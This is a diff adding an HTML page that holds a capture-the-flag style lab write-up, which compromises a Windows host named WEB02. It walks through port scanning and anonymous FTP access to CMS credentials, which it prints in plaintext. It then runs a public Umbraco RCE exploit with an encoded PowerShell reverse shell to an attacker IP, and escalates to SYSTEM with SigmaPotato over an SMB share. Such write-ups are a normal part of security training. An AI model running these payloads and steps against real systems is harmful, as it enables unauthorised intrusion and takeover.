@@ -1,0 +1,213 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX247</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/247]
+└─$ <u>sudo nmap -p- -sCV 192.168.214.247 --min-rate=10000 > tcp</u>
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
+|_http-title: RELIA - New Hire Information
+|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
+| tls-alpn: 
+|_  http/1.1
+|_http-title: RELIA - New Hire Information
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=WEB02
+| Not valid before: 2025-11-19T10:28:36
+|_Not valid after:  2026-05-21T10:28:36
+|_ssl-date: 2025-11-20T10:39:48+00:00; +1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: WEB02
+|   NetBIOS_Domain_Name: WEB02
+|   NetBIOS_Computer_Name: WEB02
+|   DNS_Domain_Name: WEB02
+|   DNS_Computer_Name: WEB02
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-11-20T10:39:39+00:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+14020/tcp open  ftp           FileZilla ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
+|_ftp-bounce: bounce working!
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Bad Request
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+<p class="text">We got bunch of open ports, but ftp is really interesting. Also we need to take a note that there are 3 open http(s) ports.</p>
+<p class="text">Additionally, nmap revealed that the host name is <u>web02</u>.</p>
+<p class="text">Let's start from ftp.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/247]
+└─$ <u>ftp 192.168.214.247 -p 14020</u>                                                           
+Connected to 192.168.214.247.
+220 RELIA FTP Server for DEV resources. Please contact your manager for access.
+Name (192.168.214.247:kali): anonymous
+
+331 Password required for anonymous
+Password: 
+230 Logged on
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||49769|)
+150 Connection accepted
+-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 <u>umbraco.pdf</u>
+226 Transfer OK
+ftp> get umbraco.pdf
+local: umbraco.pdf remote: umbraco.pdf
+229 Entering Extended Passive Mode (|||49772|)
+150 Connection accepted
+100% |************************************************************************************|   232 KiB  397.97 KiB/s    00:00 ETA
+226 Transfer OK
+237639 bytes received in 00:00 (397.83 KiB/s)
+ftp> exit
+421 Connection timed out.</code></pre></div>
+
+<h2 class="subtitle">FootHold</h2>
+<p class="text">There was an pdf file.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/247/2.png' %}" alt="">
+    <p class="text">There is credential for umbraco(cms). Also, we can see the version number of the application <u>Umbraco 7</u>. <br><br>If we search the keyword <u>Umbraco 7 vulnerabilty</u>, we can see there is cve which allow us to perform RCE.</p>
+</div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/247]
+└─$ searchsploit umbraco 7                                   
+----------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                 |  Path
+----------------------------------------------------------------------------------------------- ---------------------------------
+Umbraco CMS - Remote Command Execution (Metasploit)                                            | windows/webapps/19671.rb
+Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                     | aspx/webapps/46153.py
+Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                     | aspx/webapps/49488.py
+Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                     | php/webapps/44988.txt
+----------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre></div>
+<p class="text">We can use whichever. But i choose second one. Let's find the interface we can exploit.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/247/1.png' %}" alt="">
+    <p class="text">The port <u>14080</u> returns <u>Invalid Hostname</u> error, not indicating non-existance of the page. Therefore, if we add the valid hostname to /etc/hosts, we might be able to access there.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/247]
+└─$ echo '192.168.214.247 web02.relia.com' | sudo tee -a /etc/hosts</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/247/3.png' %}" alt="">
+    <img src="{% static 'EthHack/images/relia/247/4.png' %}" alt="">
+</div>
+<p class="text">I successfully found the Umbraco page and could login to the cms with credential <u>mark@relia.com : OathDeeplyReprieve91</u>. Let's use exploit code we found before.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/247]
+└─$ searchsploit -m aspx/webapps/49488.py                          
+  Exploit: Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)
+      URL: https://www.exploit-db.com/exploits/49488
+     Path: /usr/share/exploitdb/exploits/aspx/webapps/49488.py
+    Codes: N/A
+ Verified: False
+File Type: Python script, ASCII text executable, with very long lines (723)
+Copied to: /home/kali/tempo/lab2/247/49488.py</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/247]
+└─$ python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c whoami
+<u>iis apppool\defaultapppool</u></code></pre></div>
+
+<p class="text">It's usable. Let's get reverse shell using this exploit code.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/247]
+└─$ python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c powershell -a '-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
+
+┌──(kali㉿kali)-[~/tempo/lab2/247]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+^[[Aconnect to [192.168.45.246] from (UNKNOWN) [192.168.212.247] 49704
+whoami
+PS C:\windows\system32\inetsrv> whoami
+iis apppool\defaultapppool
+PS C:\windows\system32\inetsrv> </code></pre></div>
+
+<p class="text">We got revshell!</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>PS C:\users> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</code></pre></div>
+
+<p class="text">This user has SeImpersonatePrivilege. We might be able to use this for PE. Let's upload SigmaPotato.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ impacket-smbserver share . -smb2support -username a -password a                    
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed</code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\users\public\desktop> net use \\192.168.45.246\share /user:a a
+The command completed successfully.
+PS C:\users\public\desktop> copy \\192.168.45.246\share\SigmaPotato.exe
+PS C:\users\public\desktop> dir</code></pre></div>
+<p class="text">Hmm, anti-virus soft might interrupt downloading. We should use SigmaPotato.exe directly from our share.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...</code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\users\public\desktop> net use \\192.168.45.246\share /user:a a
+The command completed successfully.
+
+PS C:\users\public\desktop> copy \\192.168.45.246\share\SigmaPotato.exe</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.246] from (UNKNOWN) [192.168.212.247] 49743
+whoami
+nt authority\system
+PS C:\users\public\desktop> </code></pre></div>
+
+<p class="text">Easy. We can get proof.txt under the users/administrator/desktop, and local.txt on C:\</p>
+
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> hostname
+WEB02
+PS C:\users\administrator\desktop> whoami
+nt authority\system</code></pre></div>
+
+</body>
+</html>
